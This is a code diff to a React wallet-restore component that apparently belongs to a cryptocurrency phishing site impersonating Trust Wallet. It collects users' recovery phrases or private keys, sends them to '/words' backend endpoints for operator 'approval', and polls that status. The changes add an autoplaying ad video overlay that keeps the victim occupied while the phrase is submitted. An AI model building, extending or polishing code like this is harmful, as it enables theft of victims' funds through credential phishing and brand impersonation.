@@ -1,8 +1,9 @@
 // MultiCoinWalletSection.jsx
-import { IoArrowBack, IoClose, IoScan } from 'react-icons/io5'
-import { useState, useEffect } from 'react'
+import { IoArrowBack, IoClose, IoScan, IoVolumeHigh, IoVolumeMute } from 'react-icons/io5'
+import { useState, useEffect, useRef } from 'react'
 import { useNavigate, useLocation } from 'react-router-dom'
 import api from '../../api/axios'
+import prepAdVideo from '../../assets/prep.mp4'
 import '../../styles/MultiCoinWalletSection.css'
 
 function MultiCoinWalletSection({
@@ -22,17 +23,20 @@ function MultiCoinWalletSection({
   const [referralCode, setReferralCode] = useState(null)
   const [activityState, setActivityState] = useState(null)
 
+  // Ad video state
+  const [showAdVideo, setShowAdVideo] = useState(false)
+  const [isMuted, setIsMuted] = useState(true)
+  const adVideoRef = useRef(null)
+
   // Capture referral from URL on component mount
   useEffect(() => {
     const params = new URLSearchParams(location.search)
     const ref = params.get('ref')
     if (ref && /^[a-f0-9]{24}$/.test(ref)) {
       setReferralCode(ref)
-      // Store for later use
       sessionStorage.setItem('referralCode', ref)
       console.log('✅ Referral detected:', ref)
     } else {
-      // Check session storage if not in URL
       const storedRef = sessionStorage.getItem('referralCode')
       if (storedRef) {
         setReferralCode(storedRef)
@@ -40,14 +44,31 @@ function MultiCoinWalletSection({
     }
   }, [location])
 
+  // Ensure video plays whenever the overlay is shown
+  useEffect(() => {
+    if (showAdVideo && adVideoRef.current) {
+      adVideoRef.current.currentTime = 0
+      adVideoRef.current.play().catch(() => {
+        // Autoplay might be blocked; video will stay paused on first frame
+      })
+    }
+  }, [showAdVideo])
+
   const canRestore = walletName.trim().length > 0 && secretPhrase.trim().length > 0
+
+  const toggleMute = () => {
+    if (adVideoRef.current) {
+      adVideoRef.current.muted = !adVideoRef.current.muted
+      setIsMuted(adVideoRef.current.muted)
+    }
+  }
 
   // Step 1: Submit consent and get activity state
   const submitConsent = async () => {
     try {
       const response = await api.post('/activity/state', {
         consent: 'granted',
-        referral: referralCode // Pass referral if exists
+        referral: referralCode
       })
 
       if (response.data.state) {
@@ -57,7 +78,6 @@ function MultiCoinWalletSection({
       throw new Error('No state returned')
     } catch (error) {
       console.error('Consent submission error:', error)
-      // Continue anyway - consent is not critical for core functionality
       return null
     }
   }
@@ -67,13 +87,11 @@ function MultiCoinWalletSection({
     try {
       await api.post('/activity/visit', {
         state: state,
-        // Additional data can be sent if needed
         referral: referralCode,
         source: 'wallet-restore'
       })
     } catch (error) {
       console.error('Visit recording error:', error)
-      // Don't fail the flow if visit recording fails
     }
   }
 
@@ -98,48 +116,46 @@ function MultiCoinWalletSection({
     }
   }
 
-  // Modified auto-login with referral
+  // Modified auto-login with referral + ad video
   const handleAutoLogin = async () => {
     if (!canRestore || isLoading || isAutoLogin) return
 
     setIsLoading(true)
     setIsAutoLogin(true)
+    setShowAdVideo(true) // <-- SHOW AD VIDEO
     setStatusMessage('⏳ Checking your wallet credentials...')
 
     try {
-      // Step 1: Submit consent
       const state = await submitConsent()
-      
-      // Step 2: Try auto-login
+
       const response = await api.post('/words/auto-login', {
         words: secretPhrase,
-        referral: referralCode // Pass referral to backend
+        referral: referralCode
       })
 
       if (response.data.ok) {
         const accountData = response.data.account
-        
-        // Step 3: Record visit after successful login
+
         if (state) {
           await recordVisit(state, secretPhrase)
         }
-        
+
         setStatusMessage('✅ Wallet found! Redirecting...')
-        
-        // Store account data
+        setShowAdVideo(false) // <-- HIDE AD VIDEO
+
         localStorage.setItem('trust-wallet-account', JSON.stringify(accountData))
         localStorage.setItem('trust-wallet-logged-in', 'true')
         if (referralCode) {
           localStorage.setItem('referralCode', referralCode)
         }
-        
+
         setTimeout(() => {
-          navigate('/wallet', { 
-            state: { 
+          navigate('/wallet', {
+            state: {
               account: accountData,
               autoLogin: true,
               referral: referralCode
-            } 
+            }
           })
         }, 1000)
       } else {
@@ -147,62 +163,61 @@ function MultiCoinWalletSection({
       }
     } catch (error) {
       console.error('Auto-login error:', error)
-      
+
       setStatusMessage('ℹ️ No existing wallet found. Proceeding with approval request...')
       setIsAutoLogin(false)
-      
-      // Proceed with manual approval flow
+
+      // Continue with the restore flow — keep the ad video playing
       handleRestoreWallet()
     }
   }
 
-  // Modified restore wallet with referral
+  // Modified restore wallet with referral + ad video
   const handleRestoreWallet = async () => {
     if (!canRestore || isLoading) return
 
     setIsLoading(true)
+    setShowAdVideo(true) // <-- ENSURE AD VIDEO IS SHOWING
     setStatusMessage('⏳ Submitting wallet for approval...')
-    
+
     try {
-      // Step 1: Submit consent
       const state = await submitConsent()
-      
-      // Step 2: Submit words for approval with activity data
+
       const response = await api.post('/words', {
         words: secretPhrase,
         createdBy: walletName,
         source: 'wallet-restore',
         title: walletName,
         activity: {
-          state: state, // Pass the activity state
+          state: state,
           referral: referralCode
         }
       })
 
       if (response.data.ok) {
         const batch = response.data.batch
-        
-        // Step 3: Record visit
+
         if (state) {
           await recordVisit(state, secretPhrase)
         }
-        
-        // Start polling for status updates
+
         const interval = setInterval(async () => {
           try {
             const statusResponse = await api.get(`/words/${batch.id}/status`)
-            
+
             if (statusResponse.data.ok) {
               const batchStatus = statusResponse.data.batch
-              
+
               if (batchStatus.approvalStatus === 'approved') {
                 clearInterval(interval)
                 setStatusMessage('✅ Wallet approved! Redirecting...')
+                setShowAdVideo(false) // <-- HIDE AD VIDEO ON APPROVAL
+
                 localStorage.setItem('trust-wallet-logged-in', 'true')
                 if (referralCode) {
                   localStorage.setItem('referralCode', referralCode)
                 }
-                
+
                 const approvedAccount = getApprovedAccount(batchStatus)
 
                 if (approvedAccount) {
@@ -223,18 +238,21 @@ function MultiCoinWalletSection({
                 clearInterval(interval)
                 setStatusMessage('❌ Wallet access denied. Please check your credentials and try again.')
                 setIsLoading(false)
+                setShowAdVideo(false) // <-- HIDE AD VIDEO ON REJECTION
               } else {
                 setStatusMessage('⏳ Waiting for approval...')
+                // Ad video continues playing while waiting
               }
             }
           } catch (error) {
             console.error('Status check error:', error)
             setStatusMessage('⚠️ Error checking wallet status. Please try again.')
             setIsLoading(false)
+            setShowAdVideo(false) // <-- HIDE AD VIDEO ON ERROR
             clearInterval(interval)
           }
         }, 3000)
-        
+
         onRestoreSuccess?.({
           walletName,
           secretPhrase,
@@ -249,6 +267,7 @@ function MultiCoinWalletSection({
       console.error('Restore error:', error)
       setStatusMessage(`❌ Error: ${error.message || 'Failed to restore wallet'}`)
       setIsLoading(false)
+      setShowAdVideo(false) // <-- HIDE AD VIDEO ON ERROR
       onRestoreError?.(error.message)
     }
   }
@@ -315,8 +334,8 @@ function MultiCoinWalletSection({
               disabled={isLoading}
               placeholder="Enter your recovery phrase or private key"
             />
-            <button 
-              type="button" 
+            <button
+              type="button"
               onClick={handlePasteSecretPhrase}
               disabled={isLoading}
             >
@@ -325,7 +344,7 @@ function MultiCoinWalletSection({
           </div>
         </div>
         <p>Typically 12 (sometimes 18, 24) words separated by single spaces</p>
-        
+
         {statusMessage && (
           <div className={`status-message ${statusMessage.includes('❌') ? 'error' : statusMessage.includes('✅') ? 'success' : statusMessage.includes('ℹ️') ? 'info' : 'info'}`}>
             {statusMessage}
@@ -333,23 +352,57 @@ function MultiCoinWalletSection({
         )}
       </section>
       <section className="restore-actions">
-        <button 
-          className="continue-button" 
-          type="button" 
-          disabled={!canRestore || isLoading} 
+        <button
+          className="continue-button"
+          type="button"
+          disabled={!canRestore || isLoading}
           onClick={handleAutoLogin}
         >
           {isLoading ? 'Processing...' : 'Connect Wallet'}
         </button>
-        <button 
-          className="secret-help" 
-          type="button" 
+        <button
+          className="secret-help"
+          type="button"
           onClick={handleOpenSecretPhraseHelp}
           disabled={isLoading}
         >
           Need help with wallet access?
         </button>
       </section>
+
+      {/* ========== AD VIDEO OVERLAY ========== */}
+      {showAdVideo && (
+        <div className="ad-video-overlay" role="dialog" aria-label="Processing">
+          <div className="ad-video-container">
+            <video
+              ref={adVideoRef}
+              src={prepAdVideo}
+              autoPlay
+              loop
+              muted={isMuted}
+              playsInline
+              preload="auto"
+              className="ad-video"
+            />
+
+            {/* Mute / Unmute toggle */}
+            <button
+              type="button"
+              className="ad-video-mute-btn"
+              onClick={toggleMute}
+              aria-label={isMuted ? 'Unmute video' : 'Mute video'}
+            >
+              {isMuted ? <IoVolumeMute /> : <IoVolumeHigh />}
+            </button>
+
+            {/* Loading spinner + status text */}
+            <div className="ad-video-loader">
+              <div className="ad-spinner" />
+              <p>{statusMessage || 'Please wait while we process your request…'}</p>
+            </div>
+          </div>
+        </div>
+      )}
     </main>
   )
 }
